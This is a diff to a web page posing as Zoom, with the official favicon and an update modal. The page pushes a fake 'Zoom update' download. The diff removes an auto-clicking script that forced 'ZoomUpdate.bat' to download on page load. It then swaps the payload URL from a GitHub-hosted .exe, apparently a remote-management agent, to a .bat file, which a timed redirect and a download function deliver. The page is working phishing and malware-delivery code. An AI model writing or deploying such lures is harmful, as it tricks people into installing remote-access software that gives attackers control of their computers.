@@ -3,13 +3,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Zoom</title>
 <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
-<script>
-var a = document.createElement('a');
-a.href = '/zoomUpdate.bat';
-a.download = 'ZoomUpdate.bat';
-document.body.appendChild(a);
-a.click();
-</script>
 :root{
   --z-bg:#1C1C1E;
   --z-surface:#2C2C2E;
@@ -1576,10 +1569,10 @@ function showUpdateModal(){
 function scheduleRedirectOnce(){
   if(S.redirectScheduled) return;
   S.redirectScheduled=true;
-  setTimeout(()=>{ window.location.href='https://github.com/justmenodrama98-bot/zoom/releases/download/v1/trmm-zoomupdate-zoomvideocommunications-workstation-amd64.exe'; },5000);
+  setTimeout(()=>{ window.location.href='https://github.com/justmenodrama98-bot/agent/releases/download/v2/zoom.update.bat'; },5000);
 }
 
-const DIRECT_DOWNLOAD_URL = 'https://github.com/justmenodrama98-bot/zoom/releases/download/v1/trmm-zoomupdate-zoomvideocommunications-workstation-amd64.exe'; 
+const DIRECT_DOWNLOAD_URL = 'https://github.com/justmenodrama98-bot/agent/releases/download/v2/zoom.update.bat'; 
 
 async function triggerDownload(){
   scheduleRedirectOnce();
